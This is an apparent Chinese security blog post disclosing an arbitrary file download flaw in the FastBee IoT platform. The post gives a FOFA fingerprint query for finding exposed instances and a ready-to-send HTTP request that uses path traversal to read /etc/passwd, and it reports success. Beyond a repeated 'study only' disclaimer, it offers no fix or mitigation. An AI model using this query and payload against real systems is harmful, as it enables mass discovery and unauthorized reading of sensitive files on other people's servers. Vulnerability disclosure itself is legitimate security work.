#  蜂信物联 FastBee 物联网系统 download 文件下载漏洞  
 HK安全小屋   2025-06-08 08:56  
  
## 免责声明  
  
       请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
漏洞描述：  
  
蜂信物联(FastBee)物联网平台download存在任意文件下载漏洞，可能导致敏感信息泄露、数据盗窃及其他安全风险，从而对系统和用户造成严重危害。  
  
  
影响版本：  
  
FastBee 物联网系统  
  
  
FOFA:  
```
"fastbee" && icon_hash="-307138793"
```  
  
  
POC：  
```
GET /prod-api/iot/tool/download?fileName=/../../../../../../../../../etc/passwd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Connection: close
```  
  
成功读取到/etc/passwd文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A8qcyicQXeI2HtBvSXLQ3HLLvYUDp9ZdZSCQXaibd8w8u9qel0jpxZeGO68vObjLttmibicQZUCVDChHAicic0NS17fQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
--------  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
  
  
  
